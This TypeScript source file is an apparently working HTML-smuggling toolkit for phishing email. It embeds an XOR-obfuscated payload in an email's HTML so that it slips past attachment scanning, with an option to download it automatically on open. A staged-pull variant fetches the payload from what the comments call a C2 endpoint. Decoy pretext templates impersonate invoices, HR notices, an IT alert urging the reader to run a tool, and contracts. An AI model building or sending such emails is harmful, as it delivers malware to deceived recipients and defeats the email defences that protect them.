/**
 * HTML Smuggler
 *
 * Embeds an encoded payload inside an HTML email body.
 * The payload is reconstructed client-side by JavaScript, bypassing
 * email gateway attachment scanning (payload never transits as a MIME part).
 *
 * Works in: Outlook Desktop, Thunderbird, web mail clients that allow JS.
 * Falls back gracefully in sandboxed clients (Gmail, iOS Mail) — they just
 * see the decoy HTML; the download silently fails without error.
 */

export interface SmuggleOptions {
  /** Base64-encoded raw bytes of the payload to deliver */
  payloadBase64: string
  /** Filename the browser will save the download as */
  filename: string
  /** Visible email body HTML (the decoy content) */
  decoyHtml: string
  /**
   * XOR obfuscation key (1-255).
   * When set, the payload is XOR'd before embedding so it doesn't
   * appear as a raw base64-encoded PE/ELF in the email source.
   */
  xorKey?: number
  /**
   * MIME type for the blob download.
   * Defaults to application/octet-stream.
   */
  mimeType?: string
  /** Auto-trigger the download on page load (true) vs on button click (false) */
  autoDownload?: boolean
  /** Optional decoy link text (used when autoDownload=false) */
  downloadLinkText?: string
}

/**
 * XOR-encode a base64 string at the byte level.
 * Returns a comma-separated decimal array string for inline JS.
 */
function xorEncode(b64: string, key: number): string {
  const raw = Buffer.from(b64, "base64")
  const out: number[] = []
  for (let i = 0; i < raw.length; i++) {
    out.push(raw[i] ^ key)
  }
  return out.join(",")
}

/**
 * Chunk a string into lines of maxLen for readability in source.
 */
function chunkString(s: string, maxLen = 76): string {
  const chunks: string[] = []
  for (let i = 0; i < s.length; i += maxLen) {
    chunks.push(s.slice(i, i + maxLen))
  }
  return chunks.map((c) => `"${c}"`).join("+\n    ")
}

/**
 * Generate an HTML email that smuggles a payload.
 *
 * The resulting string should be used as the `htmlBody` in sendEnhancedEmail().
 * Do NOT add it as an attachment — the whole point is the payload is inline.
 */
export function generateSmuggleEmail(opts: SmuggleOptions): string {
  const {
    payloadBase64,
    filename,
    decoyHtml,
    xorKey,
    mimeType = "application/octet-stream",
    autoDownload = true,
    downloadLinkText = "Download Attachment",
  } = opts

  // Build the JS payload expression
  let jsPayload: string
  if (xorKey !== undefined && xorKey > 0) {
    const encoded = xorEncode(payloadBase64, xorKey)
    // JS reconstructs: XOR-decode byte array → Uint8Array → Blob
    jsPayload = `(function(){
    var k=${xorKey},d=[${encoded}];
    var b=new Uint8Array(d.length);
    for(var i=0;i<d.length;i++){b[i]=d[i]^k;}
    return b;
  })()`
  } else {
    // Plain base64 — atob() decodes to binary string, convert to Uint8Array
    const chunked = chunkString(payloadBase64)
    jsPayload = `(function(){
    var b64=${chunked};
    var raw=atob(b64);
    var b=new Uint8Array(raw.length);
    for(var i=0;i<raw.length;i++){b[i]=raw.charCodeAt(i);}
    return b;
  })()`
  }

  const triggerFn = autoDownload ? "dl()" : ""
  const buttonHtml = autoDownload
    ? ""
    : `<p style="margin:16px 0;"><a id="dlbtn" href="#" style="display:inline-block;padding:10px 22px;background:#0078d4;color:#fff;text-decoration:none;border-radius:4px;font-family:sans-serif;">${downloadLinkText}</a></p>`

  const buttonScript = autoDownload
    ? ""
    : `\n  document.getElementById('dlbtn').addEventListener('click',function(e){e.preventDefault();dl();});`

  return `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
</head>
<body>
${decoyHtml}
${buttonHtml}
<script>
(function(){
  function dl(){
    try{
      var payload=${jsPayload};
      var blob=new Blob([payload],{type:${JSON.stringify(mimeType)}});
      var url=URL.createObjectURL(blob);
      var a=document.createElement('a');
      a.href=url;
      a.download=${JSON.stringify(filename)};
      document.body.appendChild(a);
      a.click();
      setTimeout(function(){URL.revokeObjectURL(url);a.remove();},2000);
    }catch(e){}
  }
  ${triggerFn}${buttonScript}
})();
</script>
</body>
</html>`
}

/**
 * Generate a staged-pull HTML email.
 *
 * Instead of embedding the payload, the email body contains a JS fetch()
 * call that downloads the payload from a URL on first open/click.
 * The URL should point to your C2 or sub endpoint.
 *
 * Advantage: payload never touches the email at all; can be swapped
 * server-side after delivery; supports per-recipient targeting.
 */
export function generateStagedPullEmail(opts: {
  payloadUrl: string
  filename: string
  decoyHtml: string
  autoDownload?: boolean
  downloadLinkText?: string
}): string {
  const {
    payloadUrl,
    filename,
    decoyHtml,
    autoDownload = false,
    downloadLinkText = "View Document",
  } = opts

  const triggerFn = autoDownload ? "dl()" : ""
  const buttonHtml = autoDownload
    ? ""
    : `<p style="margin:16px 0;"><a id="dlbtn" href="${payloadUrl}" style="display:inline-block;padding:10px 22px;background:#0078d4;color:#fff;text-decoration:none;border-radius:4px;font-family:sans-serif;">${downloadLinkText}</a></p>`

  const buttonScript = autoDownload
    ? ""
    : `\n  document.getElementById('dlbtn').addEventListener('click',function(e){e.preventDefault();dl();});`

  return `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
</head>
<body>
${decoyHtml}
${buttonHtml}
<script>
(function(){
  function dl(){
    fetch(${JSON.stringify(payloadUrl)},{credentials:'omit'})
      .then(function(r){return r.blob();})
      .then(function(blob){
        var url=URL.createObjectURL(blob);
        var a=document.createElement('a');
        a.href=url;
        a.download=${JSON.stringify(filename)};
        document.body.appendChild(a);
        a.click();
        setTimeout(function(){URL.revokeObjectURL(url);a.remove();},2000);
      })
      .catch(function(){});
  }
  ${triggerFn}${buttonScript}
})();
</script>
</body>
</html>`
}

/**
 * Common pretext templates.
 * These are decoy HTML bodies for the email content.
 */
export const PRETEXT_TEMPLATES = {
  invoice: (companyName: string, invoiceNum: string) => `
<div style="font-family:Calibri,Arial,sans-serif;max-width:600px;margin:0 auto;color:#333;">
  <div style="background:#1a1a2e;padding:20px 30px;">
    <h2 style="color:#fff;margin:0;font-size:18px;">${companyName}</h2>
  </div>
  <div style="padding:30px;border:1px solid #e0e0e0;border-top:none;">
    <p>Dear Valued Customer,</p>
    <p>Please find attached your invoice <strong>${invoiceNum}</strong> for the current billing period.</p>
    <p>The document will download automatically. If prompted by your browser, please allow the download.</p>
    <p>For questions, contact <a href="mailto:billing@${companyName.toLowerCase().replace(/\s/g, "")}.com">billing</a>.</p>
    <p style="margin-top:30px;">Regards,<br><strong>Accounts Payable</strong><br>${companyName}</p>
  </div>
</div>`,

  hr_policy: (companyName: string) => `
<div style="font-family:Calibri,Arial,sans-serif;max-width:600px;margin:0 auto;color:#333;">
  <div style="background:#003366;padding:20px 30px;">
    <h2 style="color:#fff;margin:0;">Human Resources</h2>
    <p style="color:#aac4e8;margin:4px 0 0;">Policy Update Notification</p>
  </div>
  <div style="padding:30px;border:1px solid #e0e0e0;border-top:none;">
    <p>All Staff,</p>
    <p>Please review the attached <strong>Updated Remote Work Policy</strong> effective immediately.</p>
    <p>Action required: Read and acknowledge receipt by end of business today.</p>
    <p style="margin-top:30px;">HR Department<br>${companyName}</p>
  </div>
</div>`,

  it_alert: () => `
<div style="font-family:Calibri,Arial,sans-serif;max-width:600px;margin:0 auto;color:#333;">
  <div style="background:#c00;padding:20px 30px;">
    <h2 style="color:#fff;margin:0;">⚠ IT Security Alert</h2>
  </div>
  <div style="padding:30px;border:1px solid #e0e0e0;border-top:none;">
    <p>Your account requires immediate verification.</p>
    <p>Please download and run the <strong>Security Compliance Tool</strong> attached to this email to complete the verification process.</p>
    <p>Failure to comply within 24 hours will result in account suspension.</p>
    <p style="margin-top:30px;">IT Security Team</p>
  </div>
</div>`,

  contract: (counterparty: string) => `
<div style="font-family:Georgia,serif;max-width:600px;margin:0 auto;color:#333;">
  <div style="border-bottom:2px solid #333;padding-bottom:12px;margin-bottom:24px;">
    <h2 style="margin:0;font-size:16px;letter-spacing:2px;text-transform:uppercase;">Contract Review</h2>
  </div>
  <p>Please find attached the draft agreement from <strong>${counterparty}</strong> for your review.</p>
  <p>The document will open automatically. Please review all terms before the scheduled call.</p>
  <p style="margin-top:40px;font-style:italic;">This email and any attachments are confidential.</p>
</div>`,
} as const
